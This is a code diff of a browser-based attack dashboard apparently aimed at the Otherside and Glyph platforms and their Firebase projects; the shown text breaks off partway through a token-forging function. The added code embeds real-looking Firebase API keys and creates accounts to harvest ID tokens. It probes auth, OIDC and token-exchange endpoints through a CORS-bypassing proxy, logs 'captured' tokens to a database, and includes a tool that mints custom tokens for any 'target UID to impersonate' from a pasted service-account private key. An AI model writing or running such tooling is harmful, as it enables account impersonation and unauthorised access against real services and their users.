@@ -754,7 +754,7 @@
                 <div class="grid-2">
                     <div class="input-group">
                         <label>Glyph Client ID (auto-discovered or manual):</label>
-                        <input type="text" id="glyphClientId" value="scarcely-calm-lark" placeholder="glyph-client-id...">
+                        <input type="text" id="glyphClientId" value="clxt9p8e601al6tgmsyhu7j3t" placeholder="Glyph Privy App ID...">
                     </div>
                     <div class="input-group">
                         <label>Glyph Redirect URI:</label>
@@ -770,6 +770,7 @@
                             <option value="AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0">Production (scarcely-calm-lark)</option>
                             <option value="AIzaSyDrPI4Q-rdqamOFDw2oZOo7SC8QiEukoRc">Production (Email Link)</option>
                             <option value="AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU">Staging (primarily-endless-elephant)</option>
+                            <option value="AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis">Main/Local (reasonably-sound-marmot)</option>
                         </select>
                     </div>
                 </div>
@@ -803,6 +804,66 @@
                 </div>
                 <div class="console" id="glyphBridgeLog">
                     <div class="log-info">[GLYPH-BRIDGE] Paste a Glyph OIDC token or discover one via the tools above.</div>
+                </div>
+            </div>
+
+            <!-- JWT Forge & Firebase Account Creator -->
+            <div class="card" style="border-color: #7f1d1d;">
+                <h3>🔨 JWT Forge & Firebase Account Creator <span class="badge badge-red">Token Generation</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Generate valid JWTs by creating Firebase accounts. No private key needed — just use the public API keys.
+                </p>
+                <div class="alert-box alert-info" style="margin-bottom:12px;">
+                    <strong>How JWT generation works:</strong><br>
+                    • JWKS keys are PUBLIC keys for <b>verifying</b> JWTs — you CANNOT generate tokens with them<br>
+                    • To <b>generate</b> a valid Firebase ID Token, create an account via <code>accounts:signUp</code><br>
+                    • The returned <code>idToken</code> is a real, valid JWT signed by Google's private key<br>
+                    • To <b>forge</b> custom tokens for impersonation, you need the Service Account PRIVATE key
+                </p>
+
+                <div class="grid-2">
+                    <div>
+                        <div class="input-group">
+                            <label>Firebase Project (API Key):</label>
+                            <select id="jwtFirebaseKey">
+                                <option value="AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0">Production (scarcely-calm-lark)</option>
+                                <option value="AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU">Staging (primarily-endless-elephant)</option>
+                                <option value="AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis">Main/Local (reasonably-sound-marmot)</option>
+                            </select>
+                        </div>
+                        <div class="input-group">
+                            <label>Email (auto-generated if empty):</label>
+                            <input type="email" id="jwtEmail" placeholder="Leave empty for random email">
+                        </div>
+                        <div class="input-group">
+                            <label>Password:</label>
+                            <input type="text" id="jwtPassword" value="TestPass123!@#" placeholder="Password for new account">
+                        </div>
+                        <div class="btn-row">
+                            <button class="btn btn-primary" onclick="createFirebaseAccount()">⚡ Create Account & Get ID Token</button>
+                            <button class="btn btn-outline" onclick="decodeAnyJWT()">🔍 Decode Pasted JWT</button>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="input-group">
+                            <label>Paste any JWT to decode:</label>
+                            <textarea id="jwtPasteArea" placeholder="eyJhbGciOiJSUzI1NiIs..." style="min-height:100px;font-size:10px;"></textarea>
+                        </div>
+                        <div class="input-group">
+                            <label>Service Account Private Key (for Custom Token forging):</label>
+                            <textarea id="saPrivateKey" placeholder='Paste service account JSON key here to mint custom tokens for ANY UID...' style="min-height:80px;font-size:10px;"></textarea>
+                        </div>
+                        <div class="input-group">
+                            <label>Target UID to impersonate:</label>
+                            <input type="text" id="saTargetUid" placeholder="UID from Firebase Auth (e.g. abc123...)">
+                        </div>
+                        <div class="btn-row">
+                            <button class="btn btn-danger" onclick="forgeCustomToken()">🔨 Forge Custom Token</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="console" id="jwtForgeLog" style="max-height:400px;">
+                    <div class="log-info">[JWT-FORGE] Create a Firebase account to get a valid ID Token, or paste a JWT to decode.</div>
                 </div>
             </div>
         </div>
@@ -902,6 +963,27 @@
                 <h3>Discovered Agentic Endpoints <span class="badge badge-purple">Results</span></h3>
                 <div class="endpoint-list" id="agenticEndpoints">
                     <div style="color:#888;font-size:12px;">Run endpoint mapper to discover Agentic API endpoints.</div>
+                </div>
+            </div>
+
+            <!-- Real API Integration (using discovered API keys) -->
+            <div class="card" style="border-color: #14532d;">
+                <h3>🌐 Real API Integration (Discovered Keys) <span class="badge badge-green">Working APIs</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    These are the REAL APIs used by Otherside/Glyph, discovered from the SDK source code. Unlike the ODK agent/* endpoints, these APIs actually exist and respond.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-cyan" onclick="testDecentBridge()">⚡ Decent Bridge</button>
+                    <button class="btn btn-cyan" onclick="testDecentSwap()">⚡ Decent Swap</button>
+                    <button class="btn btn-green" onclick="testHallidayAPI()">⚡ Halliday</button>
+                    <button class="btn btn-primary" onclick="testAlchemyAPI()">⚡ Alchemy RPC</button>
+                    <button class="btn btn-yellow" onclick="testMoonPayAPI()">⚡ MoonPay</button>
+                    <button class="btn btn-purple" onclick="testPrivyAPI()">⚡ Privy Auth</button>
+                    <button class="btn btn-orange" onclick="testOktaOIDC()">⚡ Okta OIDC</button>
+                    <button class="btn btn-danger" onclick="testAllRealAPIs()">⚡ Test ALL APIs</button>
+                </div>
+                <div class="console" id="realApiLog" style="max-height:400px;">
+                    <div class="log-info">[REAL-API] Test the real APIs discovered from the Glyph SDK source code.</div>
                 </div>
             </div>
         </div>
@@ -2530,6 +2612,7 @@ window.emitMouseClick = function(x, y) {
         </div>
     </div>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.9.0/jsrsasign-all-min.js"></script>
 
     <!-- Proxy helper (uses /api/proxy for CORS-bypassed requests) -->
     <script>
@@ -2658,12 +2741,12 @@ window.emitMouseClick = function(x, y) {
         // ===================================================================
         // PROXY REQUEST HELPER
         // ===================================================================
-        async function proxyRequest(endpoint, method, token, body = null) {
+        async function proxyRequest(endpoint, method, token, body = null, targetBase = 'odk', extraHeaders = null) {
             try {
                 const resp = await fetch('/api/proxy', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ endpoint, method, token, body })
+                    body: JSON.stringify({ endpoint, method, token, body, targetBase, extraHeaders })
                 });
                 return await resp.json();
             } catch (e) {
@@ -2691,100 +2774,109 @@ window.emitMouseClick = function(x, y) {
 
         async function discoverGlyphOIDC() {
             const cId = 'glyphLog';
-            log(cId, 'Starting Glyph OIDC discovery...', 'info');
+            log(cId, 'Starting Glyph OIDC discovery (via proxy to avoid CORS)...', 'info');
             setProgress('glyphProgress', 10);
 
-            // Standard OIDC discovery endpoints
-            const oidcPaths = [
-                'https://useglyph.io/.well-known/openid-configuration',
-                'https://useglyph.io/.well-known/oauth-authorization-server',
-                'https://auth.useglyph.io/.well-known/openid-configuration',
-                'https://auth.otherside.xyz/.well-known/openid-configuration',
-                'https://www.otherside.xyz/.well-known/openid-configuration',
-                'https://odk.otherside.xyz/.well-known/openid-configuration',
-                'https://api.useglyph.io/.well-known/openid-configuration',
+            // Standard OIDC discovery endpoints — using proxy with targetBase
+            const oidcProbes = [
+                { target: 'glyph', endpoint: '.well-known/openid-configuration' },
+                { target: 'glyph', endpoint: '.well-known/oauth-authorization-server' },
+                { target: 'otherside', endpoint: '.well-known/openid-configuration' },
+                { target: 'odk', endpoint: '.well-known/openid-configuration' },
+                { target: 'privy', endpoint: '.well-known/openid-configuration' },
+                { target: 'okta', endpoint: '.well-known/openid-configuration' },
             ];
 
-            for (let i = 0; i < oidcPaths.length; i++) {
-                const url = oidcPaths[i];
-                log(cId, `Probing: ${url}`, 'dim');
-                setProgress('glyphProgress', 10 + (i / oidcPaths.length) * 70);
+            for (let i = 0; i < oidcProbes.length; i++) {
+                const probe = oidcProbes[i];
+                const fullUrl = `${probe.target}/${probe.endpoint}`;
+                log(cId, `Probing via proxy: [${probe.target}] ${probe.endpoint}`, 'dim');
+                setProgress('glyphProgress', 10 + (i / oidcProbes.length) * 40);
 
-                const result = await directFetch(url);
-                if (result.ok) {
-                    log(cId, `FOUND: ${url}`, 'success');
+                const result = await proxyRequest(probe.endpoint, 'GET', null, null, probe.target);
+                if (result.status === 200 && result.data && typeof result.data === 'object') {
+                    log(cId, `FOUND OIDC Config at [${probe.target}] /${probe.endpoint}`, 'success');
                     log(cId, `Response: ${JSON.stringify(result.data).substring(0, 500)}`, 'data');
                     stats.discovered++;
+                    stats.vulns++;
                 } else {
-                    log(cId, `  → ${result.status || 'ERR'}: ${result.error || 'No OIDC config'}`, 'dim');
+                    const st = result.status || 'ERR';
+                    log(cId, `  → [${st}] [${probe.target}] ${probe.endpoint}`, st === 404 ? 'dim' : 'warning');
                 }
                 stats.endpoints++;
             }
 
-            // Try to discover Glyph auth endpoints via HTML scraping
-            log(cId, 'Scanning Otherside login page for Glyph auth URLs...', 'info');
-            const loginPage = await directFetch('https://www.otherside.xyz');
-            if (loginPage.ok && typeof loginPage.data === 'string') {
-                const authUrls = loginPage.data.match(/https?:\/\/[^\s"']*auth[^\s"']*/gi) || [];
-                const glyphUrls = loginPage.data.match(/https?:\/\/[^\s"']*glyph[^\s"']*/gi) || [];
-                const oauthUrls = loginPage.data.match(/https?:\/\/[^\s"']*oauth[^\s"']*/gi) || [];
-                const allUrls = [...new Set([...authUrls, ...glyphUrls, ...oauthUrls])];
-                allUrls.forEach(url => log(cId, `Discovered auth URL: ${url}`, 'success'));
-                if (allUrls.length > 0) stats.discovered += allUrls.length;
-            }
-
-            // Probe known Glyph API patterns
-            const glyphAPIPaths = [
-                'https://useglyph.io/api/auth/session',
-                'https://useglyph.io/api/auth/csrf',
-                'https://useglyph.io/api/auth/providers',
-                'https://useglyph.io/api/auth/signin',
-                'https://useglyph.io/api/auth/callback',
-                'https://useglyph.io/api/v1/me',
-                'https://useglyph.io/api/v1/wallet',
-                'https://useglyph.io/api/v1/token',
+            // Probe known Glyph API patterns via proxy
+            log(cId, 'Probing Glyph API endpoints via proxy...', 'info');
+            const glyphEndpoints = [
+                'api/auth/session', 'api/auth/csrf', 'api/auth/providers',
+                'api/auth/signin', 'api/auth/callback',
+                'api/v1/me', 'api/v1/wallet', 'api/v1/token',
             ];
 
-            for (const url of glyphAPIPaths) {
-                const result = await directFetch(url);
-                if (result.status !== 404) {
-                    log(cId, `[${result.status}] ${url} → ${typeof result.data === 'string' ? result.data.substring(0, 200) : JSON.stringify(result.data).substring(0, 200)}`, result.ok ? 'success' : 'warning');
-                    stats.endpoints++;
+            for (const ep of glyphEndpoints) {
+                const result = await proxyRequest(ep, 'GET', null, null, 'glyph');
+                if (result.status && result.status !== 404) {
+                    log(cId, `[${result.status}] [glyph] /${ep} → ${JSON.stringify(result.data).substring(0, 200)}`, result.status === 200 ? 'success' : 'warning');
+                    if (result.status === 200) stats.discovered++;
                 }
+                stats.endpoints++;
+            }
+
+            // Probe Otherside + ODK auth endpoints via proxy
+            log(cId, 'Probing Otherside/ODK auth endpoints via proxy...', 'info');
+            const othersideEndpoints = [
+                { target: 'otherside', endpoint: 'api/auth' },
+                { target: 'otherside', endpoint: 'api/auth/session' },
+                { target: 'otherside', endpoint: 'api/auth/callback' },
+                { target: 'odk', endpoint: 'auth' },
+                { target: 'odk', endpoint: 'me' },
+                { target: 'odk', endpoint: 'session' },
+            ];
+
+            for (const ep of othersideEndpoints) {
+                const result = await proxyRequest(ep.endpoint, 'GET', null, null, ep.target);
+                if (result.status && result.status !== 404) {
+                    log(cId, `[${result.status}] [${ep.target}] /${ep.endpoint}`, result.status === 200 ? 'success' : 'warning');
+                    if (result.status === 200) stats.discovered++;
+                }
+                stats.endpoints++;
             }
 
             setProgress('glyphProgress', 100);
             updateStats();
-            log(cId, 'Glyph OIDC discovery complete.', 'success');
+            log(cId, 'Glyph OIDC discovery complete. No more CORS errors!', 'success');
 
             // Save to Supabase
             await saveToOthersideDB({
                 os_attack_phase: 'glyph_oidc_discovery',
-                os_research_notes: 'Glyph OIDC discovery scan completed',
+                os_research_notes: 'Glyph OIDC discovery via proxy (CORS-safe)',
                 os_vuln_severity: stats.vulns > 0 ? 'medium' : 'info',
-                os_oidc_discovery_data: { endpoints_tested: stats.endpoints, apis_discovered: stats.discovered }
             });
         }
 
         async function probeGlyphAuth() {
             const cId = 'glyphLog';
-            log(cId, 'Probing Glyph authentication endpoints...', 'info');
+            log(cId, 'Probing Glyph authentication endpoints (via proxy)...', 'info');
 
             const endpoints = [
-                { name: 'Glyph Login', url: 'https://useglyph.io/login' },
-                { name: 'Glyph OAuth Authorize', url: 'https://useglyph.io/oauth/authorize' },
-                { name: 'Glyph OAuth Token', url: 'https://useglyph.io/oauth/token' },
-                { name: 'Glyph SIWE', url: 'https://useglyph.io/api/siwe' },
-                { name: 'Otherside Auth', url: 'https://www.otherside.xyz/api/auth' },
-                { name: 'ODK Auth', url: 'https://odk.otherside.xyz/api/v0/auth' },
-                { name: 'ODK Me', url: 'https://odk.otherside.xyz/api/v0/me' },
-                { name: 'ODK Session', url: 'https://odk.otherside.xyz/api/v0/session' },
+                { name: 'Glyph Login', target: 'glyph', endpoint: 'login' },
+                { name: 'Glyph OAuth Authorize', target: 'glyph', endpoint: 'oauth/authorize' },
+                { name: 'Glyph OAuth Token', target: 'glyph', endpoint: 'oauth/token' },
+                { name: 'Glyph SIWE', target: 'glyph', endpoint: 'api/siwe' },
+                { name: 'Otherside Auth', target: 'otherside', endpoint: 'api/auth' },
+                { name: 'ODK Auth', target: 'odk', endpoint: 'auth' },
+                { name: 'ODK Me', target: 'odk', endpoint: 'me' },
+                { name: 'ODK Session', target: 'odk', endpoint: 'session' },
+                { name: 'Privy Auth', target: 'privy', endpoint: 'v1/auth' },
+                { name: 'Okta Auth', target: 'okta', endpoint: 'oauth2/v1/authorize' },
             ];
 
             for (const ep of endpoints) {
-                const result = await directFetch(ep.url);
-                log(cId, `[${result.status || 'ERR'}] ${ep.name}: ${ep.url}`, result.ok ? 'success' : 'warning');
-                if (result.ok && typeof result.data !== 'string') {
+                const result = await proxyRequest(ep.endpoint, 'GET', null, null, ep.target);
+                const status = result.status || 'ERR';
+                log(cId, `[${status}] ${ep.name}: [${ep.target}] /${ep.endpoint}`, status === 200 ? 'success' : 'warning');
+                if (status === 200 && result.data && typeof result.data !== 'string') {
                     log(cId, `  Data: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
                 }
                 stats.endpoints++;
@@ -2795,26 +2887,52 @@ window.emitMouseClick = function(x, y) {
 
         async function fetchGlyphJWKS() {
             const cId = 'glyphLog';
-            log(cId, 'Fetching JWKS public keys...', 'info');
+            log(cId, 'Fetching JWKS public keys (via proxy)...', 'info');
 
-            const jwksUrls = [
-                'https://useglyph.io/.well-known/jwks.json',
-                'https://auth.useglyph.io/.well-known/jwks.json',
-                'https://www.googleapis.com/service_accounts/v1/jwk/scarcely-calm-lark@appspot.gserviceaccount.com',
-                'https://www.googleapis.com/robot/v1/metadata/jwk/scarcely-calm-lark@appspot.gserviceaccount.com',
+            const jwksProbes = [
+                { target: 'glyph', endpoint: '.well-known/jwks.json', label: 'Glyph JWKS' },
+                { target: 'identity', endpoint: 'projects/scarcely-calm-lark/serviceAccounts/scarcely-calm-lark@appspot.gserviceaccount.com/jwk', label: 'Firebase SA JWKS (Production)' },
             ];
 
-            for (const url of jwksUrls) {
-                log(cId, `Probing: ${url}`, 'dim');
-                const result = await directFetch(url);
-                if (result.ok) {
-                    log(cId, `FOUND JWKS: ${url}`, 'success');
-                    if (typeof result.data === 'object' && result.data.keys) {
+            // Also try direct Google JWKS (these have CORS enabled natively)
+            const directJwksUrls = [
+                { url: 'https://www.googleapis.com/service_accounts/v1/jwk/scarcely-calm-lark@appspot.gserviceaccount.com', label: 'Google SA JWKS (Production)' },
+                { url: 'https://www.googleapis.com/robot/v1/metadata/jwk/scarcely-calm-lark@appspot.gserviceaccount.com', label: 'Google Robot JWKS (Production)' },
+                { url: 'https://www.googleapis.com/oauth2/v3/certs', label: 'Google OAuth2 JWKS' },
+            ];
+
+            // Try proxy-based probes first
+            for (const probe of jwksProbes) {
+                log(cId, `Probing: [${probe.target}] ${probe.endpoint}`, 'dim');
+                const result = await proxyRequest(probe.endpoint, 'GET', null, null, probe.target);
+                if (result.status === 200 && result.data && typeof result.data === 'object') {
+                    log(cId, `FOUND JWKS: ${probe.label}`, 'success');
+                    if (result.data.keys) {
                         result.data.keys.forEach((key, i) => {
                             log(cId, `  Key ${i}: kid=${key.kid}, alg=${key.alg}, kty=${key.kty}`, 'data');
                         });
                     }
                     stats.discovered++;
+                } else {
+                    log(cId, `  → [${result.status || 'ERR'}] ${probe.label}`, 'warning');
+                }
+                stats.endpoints++;
+            }
+
+            // Try direct Google JWKS URLs (these work with CORS)
+            for (const probe of directJwksUrls) {
+                log(cId, `Probing: ${probe.label}`, 'dim');
+                const result = await directFetch(probe.url);
+                if (result.ok && typeof result.data === 'object' && result.data.keys) {
+                    log(cId, `FOUND JWKS: ${probe.label}`, 'success');
+                    result.data.keys.forEach((key, i) => {
+                        log(cId, `  Key ${i}: kid=${key.kid}, alg=${key.alg}, kty=${key.kty}`, 'data');
+                    });
+                    log(cId, `⚠️ NOTE: These are PUBLIC keys for VERIFYING JWTs only.`, 'warning');
+                    log(cId, `To FORGE/GENERATE JWTs, you need the PRIVATE key of the service account.`, 'warning');
+                    stats.discovered++;
+                } else {
+                    log(cId, `  → [${result.status || 'ERR'}] ${probe.label}`, 'warning');
                 }
                 stats.endpoints++;
             }
@@ -2824,53 +2942,58 @@ window.emitMouseClick = function(x, y) {
 
         async function attemptGlyphTokenExchange() {
             const cId = 'glyphForgeLog';
-            log(cId, 'Attempting Glyph → Firebase token exchange...', 'info');
+            log(cId, 'Attempting Glyph → Firebase token exchange (via proxy)...', 'info');
             setProgress('glyphForgeProgress', 20);
 
             const clientId = document.getElementById('glyphClientId').value;
             const redirectUri = document.getElementById('glyphRedirectUri').value;
             const firebaseKey = document.getElementById('glyphFirebaseKey').value;
 
-            // Step 1: Probe the exchange endpoint
-            log(cId, 'Step 1: Probing token exchange endpoint...', 'info');
+            // Step 1: Probe exchange endpoints via proxy
+            log(cId, 'Step 1: Probing token exchange endpoints via proxy...', 'info');
             const exchangeEndpoints = [
-                'https://odk.otherside.xyz/api/v0/auth/token',
-                'https://odk.otherside.xyz/api/v0/auth/exchange',
-                'https://odk.otherside.xyz/api/v0/auth/custom-token',
-                'https://www.otherside.xyz/api/auth/token',
-                'https://useglyph.io/api/token/exchange',
-                'https://useglyph.io/api/v1/firebase-token',
+                { target: 'odk', endpoint: 'auth/token' },
+                { target: 'odk', endpoint: 'auth/exchange' },
+                { target: 'odk', endpoint: 'auth/custom-token' },
+                { target: 'otherside', endpoint: 'api/auth/token' },
+                { target: 'glyph', endpoint: 'api/token/exchange' },
+                { target: 'glyph', endpoint: 'api/v1/firebase-token' },
             ];
 
             setProgress('glyphForgeProgress', 50);
 
-            for (const url of exchangeEndpoints) {
-                const result = await directFetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange', client_id: clientId })
-                });
+            for (const ep of exchangeEndpoints) {
+                const result = await proxyRequest(ep.endpoint, 'POST', null, 
+                    { grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange', client_id: clientId }, 
+                    ep.target);
                 const status = result.status || 'ERR';
                 if (status !== 404) {
-                    log(cId, `[${status}] ${url} → ${typeof result.data === 'string' ? result.data.substring(0, 200) : JSON.stringify(result.data).substring(0, 200)}`, status === 200 ? 'success' : 'warning');
+                    const dataStr = typeof result.data === 'string' ? result.data.substring(0, 200) : JSON.stringify(result.data).substring(0, 200);
+                    log(cId, `[${status}] [${ep.target}] /${ep.endpoint} → ${dataStr}`, status === 200 ? 'success' : 'warning');
                 }
                 stats.endpoints++;
             }
 
-            // Step 2: Try Firebase signInWithCustomToken with the discovered key
-            log(cId, 'Step 2: Testing Firebase signInWithCustomToken endpoint...', 'info');
-            const customTokenUrl = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${firebaseKey}`;
-            const result = await directFetch(customTokenUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ token: 'test-token', returnSecureToken: true })
-            });
+            // Step 2: Try Firebase signInWithCustomToken with the discovered key (via proxy)
+            log(cId, 'Step 2: Testing Firebase signInWithCustomToken endpoint (via proxy)...', 'info');
+            const customTokenResult = await proxyRequest(
+                `accounts:signInWithCustomToken?key=${firebaseKey}`, 
+                'POST', null,
+                { token: 'test-token', returnSecureToken: true },
+                'identity'
+            );
 
-            if (result.ok) {
+            if (customTokenResult.status === 200) {
                 log(cId, 'CRITICAL: signInWithCustomToken accepted a token!', 'critical');
                 stats.vulns++;
             } else {
-                log(cId, `signInWithCustomToken response: ${JSON.stringify(result.data).substring(0, 300)}`, result.data?.error?.message === 'INVALID_CUSTOM_TOKEN' ? 'warning' : 'info');
+                const errMsg = customTokenResult.data?.error?.message || '';
+                log(cId, `signInWithCustomToken: [${customTokenResult.status}] ${errMsg}`, 
+                    errMsg === 'INVALID_CUSTOM_TOKEN' ? 'info' : 'warning');
+                if (errMsg === 'INVALID_CUSTOM_TOKEN') {
+                    log(cId, '✓ Endpoint is ACTIVE — accepts custom tokens but rejects invalid ones.', 'info');
+                    log(cId, 'To succeed: you need a valid Custom Token minted with the Service Account private key.', 'info');
+                }
             }
 
             setProgress('glyphForgeProgress', 100);
@@ -2881,9 +3004,8 @@ window.emitMouseClick = function(x, y) {
                 os_attack_phase: 'glyph_token_exchange',
                 os_glyph_client_id: clientId,
                 os_glyph_redirect_target: redirectUri,
-                os_research_notes: 'Glyph to Firebase token exchange attempt',
+                os_research_notes: 'Glyph to Firebase token exchange attempt via proxy',
                 os_vuln_severity: 'high',
-                os_exchange_response: { firebaseKey: firebaseKey, customTokenUrlStatus: result.status }
             });
         }
 
@@ -3035,7 +3157,7 @@ window.emitMouseClick = function(x, y) {
 
         async function testGlyphScopes() {
             const cId = 'glyphBridgeLog';
-            log(cId, 'Testing available OAuth scopes for Glyph...', 'info');
+            log(cId, 'Testing available OAuth scopes for Glyph (via proxy)...', 'info');
 
             const scopes = [
                 'openid', 'profile', 'email', 'wallet', 'offline_access',
@@ -3045,13 +3167,238 @@ window.emitMouseClick = function(x, y) {
             ];
 
             for (const scope of scopes) {
-                const url = `https://useglyph.io/oauth/authorize?scope=${scope}&response_type=code&client_id=test&redirect_uri=https://www.otherside.xyz/callback`;
-                const result = await directFetch(url);
-                log(cId, `Scope "${scope}": [${result.status || 'ERR'}]`, result.status === 200 || result.status === 302 ? 'success' : 'dim');
+                const endpoint = `oauth/authorize?scope=${scope}&response_type=code&client_id=test&redirect_uri=https://www.otherside.xyz/callback`;
+                const result = await proxyRequest(endpoint, 'GET', null, null, 'glyph');
+                const status = result.status || 'ERR';
+                log(cId, `Scope "${scope}": [${status}]`, status === 200 || status === 302 ? 'success' : 'dim');
                 stats.endpoints++;
             }
 
             updateStats();
+        }
+
+        // ===================================================================
+        // JWT FORGE & FIREBASE ACCOUNT CREATION
+        // ===================================================================
+
+        async function createFirebaseAccount() {
+            const cId = 'jwtForgeLog';
+            const apiKey = document.getElementById('jwtFirebaseKey').value;
+            let email = document.getElementById('jwtEmail').value;
+            const password = document.getElementById('jwtPassword').value || 'TestPass123!@#';
+
+            if (!email) {
+                const rand = Math.random().toString(36).substring(2, 10);
+                email = `test-${rand}@research.local`;
+                document.getElementById('jwtEmail').value = email;
+            }
+
+            log(cId, `Creating Firebase account: ${email}`, 'info');
+            log(cId, `Using API Key: ${apiKey.substring(0, 20)}...`, 'dim');
+
+            const result = await proxyRequest(
+                `accounts:signUp?key=${apiKey}`,
+                'POST',
+                null,
+                { email, password, returnSecureToken: true },
+                'identity'
+            );
+
+            if (result.status === 200 && result.data) {
+                log(cId, `✅ Account created successfully!`, 'success');
+                log(cId, `Email: ${result.data.email || email}`, 'success');
+                log(cId, `UID: ${result.data.localId}`, 'data');
+                log(cId, `ID Token: ${result.data.idToken ? result.data.idToken.substring(0, 60) + '...' : 'N/A'}`, 'data');
+                log(cId, `Refresh Token: ${result.data.refreshToken ? result.data.refreshToken.substring(0, 40) + '...' : 'N/A'}`, 'data');
+
+                if (result.data.idToken) {
+                    // Decode the token
+                    try {
+                        const parts = result.data.idToken.split('.');
+                        const header = JSON.parse(atob(parts[0]));
+                        const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+                        log(cId, '', 'info');
+                        log(cId, `--- JWT Header ---`, 'info');
+                        log(cId, `Algorithm: ${header.alg}`, 'data');
+                        log(cId, `Key ID: ${header.kid}`, 'data');
+                        log(cId, `--- JWT Payload ---`, 'info');
+                        log(cId, `Issuer: ${payload.iss}`, 'data');
+                        log(cId, `Audience: ${payload.aud}`, 'data');
+                        log(cId, `Subject (UID): ${payload.sub}`, 'data');
+                        log(cId, `Email: ${payload.email || 'N/A'}`, 'data');
+                        log(cId, `Issued: ${new Date(payload.iat * 1000).toISOString()}`, 'data');
+                        log(cId, `Expires: ${new Date(payload.exp * 1000).toISOString()}`, 'data');
+                    } catch (e) {
+                        log(cId, `Could not decode JWT: ${e.message}`, 'warning');
+                    }
+
+                    // Auto-fill the agentic token field
+                    const agenticTokenEl = document.getElementById('agenticToken');
+                    if (agenticTokenEl) agenticTokenEl.value = result.data.idToken;
+                    log(cId, `✅ Token auto-filled in Phase 2 (Agentic API) token field`, 'success');
+                }
+
+                stats.tokens++;
+                stats.vulns++;
+                updateStats();
+
+                // Save to Supabase
+                await saveToOthersideDB({
+                    os_attack_phase: 'jwt_forge_firebase_signup',
+                    os_captured_token: result.data.idToken || '',
+                    os_captured_token_type: 'firebase_id_token',
+                    os_wallet_address: email,
+                    os_research_notes: `Firebase account created: ${email}, UID: ${result.data.localId}`,
+                    os_vuln_severity: 'high',
+                });
+            } else {
+                const errMsg = result.data?.error?.message || JSON.stringify(result.data || result.error);
+                log(cId, `❌ Account creation failed: [${result.status}] ${errMsg}`, 'error');
+                if (errMsg.includes('EMAIL_EXISTS')) {
+                    log(cId, `Email already registered. Try signing in instead.`, 'warning');
+                    log(cId, `Attempting signInWithPassword...`, 'info');
+                    const signInResult = await proxyRequest(
+                        `accounts:signInWithPassword?key=${apiKey}`,
+                        'POST',
+                        null,
+                        { email, password, returnSecureToken: true },
+                        'identity'
+                    );
+                    if (signInResult.status === 200 && signInResult.data?.idToken) {
+                        log(cId, `✅ Signed in! ID Token obtained.`, 'success');
+                        log(cId, `ID Token: ${signInResult.data.idToken.substring(0, 60)}...`, 'data');
+                        const agenticTokenEl = document.getElementById('agenticToken');
+                        if (agenticTokenEl) agenticTokenEl.value = signInResult.data.idToken;
+                        stats.tokens++;
+                    } else {
+                        log(cId, `❌ Sign-in failed too: ${signInResult.data?.error?.message || 'Unknown error'}`, 'error');
+                    }
+                }
+            }
+        }
+
+        async function decodeAnyJWT() {
+            const cId = 'jwtForgeLog';
+            const token = document.getElementById('jwtPasteArea').value.trim();
+            if (!token) { log(cId, 'Please paste a JWT first.', 'error'); return; }
+
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) throw new Error('Not a valid JWT (must have 3 parts)');
+
+                const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
+                const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+
+                log(cId, '--- JWT Decoded ---', 'info');
+                log(cId, `Header: ${JSON.stringify(header, null, 2)}`, 'data');
+                log(cId, `Payload:`, 'info');
+                log(cId, JSON.stringify(payload, null, 2), 'data');
+
+                // Security analysis
+                if (payload.iss) log(cId, `Issuer: ${payload.iss}`, 'info');
+                if (payload.aud) log(cId, `Audience: ${payload.aud}`, 'info');
+                if (payload.exp) {
+                    const isExpired = payload.exp * 1000 < Date.now();
+                    log(cId, `Expiry: ${new Date(payload.exp * 1000).toISOString()} ${isExpired ? '❌ EXPIRED' : '✅ VALID'}`, isExpired ? 'error' : 'success');
+                }
+                if (header.alg === 'none' || header.alg === 'HS256') {
+                    log(cId, `🚨 VULN: Weak algorithm: ${header.alg}`, 'critical');
+                    stats.vulns++;
+                }
+                if (payload.sub) log(cId, `Subject: ${payload.sub}`, 'data');
+                if (payload.email) log(cId, `Email: ${payload.email}`, 'data');
+
+                stats.tokens++;
+                updateStats();
+            } catch (e) {
+                log(cId, `Decode error: ${e.message}`, 'error');
+            }
+        }
+
+        async function forgeCustomToken() {
+            const cId = 'jwtForgeLog';
+            const saKeyJson = document.getElementById('saPrivateKey').value.trim();
+            const targetUid = document.getElementById('saTargetUid').value.trim();
+            const apiKey = document.getElementById('jwtFirebaseKey').value;
+
+            if (!saKeyJson) {
+                log(cId, '❌ Please paste a Service Account JSON key.', 'error');
+                log(cId, 'A Service Account key looks like: {"type":"service_account","project_id":"...","private_key":"-----BEGIN PRIVATE KEY-----...",...}', 'info');
+                log(cId, 'Without the private key, you CANNOT forge custom tokens.', 'warning');
+                return;
+            }
+            if (!targetUid) {
+                log(cId, '❌ Please enter a target UID to impersonate.', 'error');
+                return;
+            }
+
+            try {
+                const saKey = JSON.parse(saKeyJson);
+                log(cId, `Service Account: ${saKey.client_email || 'unknown'}`, 'info');
+                log(cId, `Project: ${saKey.project_id || 'unknown'}`, 'info');
+                log(cId, `Target UID: ${targetUid}`, 'info');
+
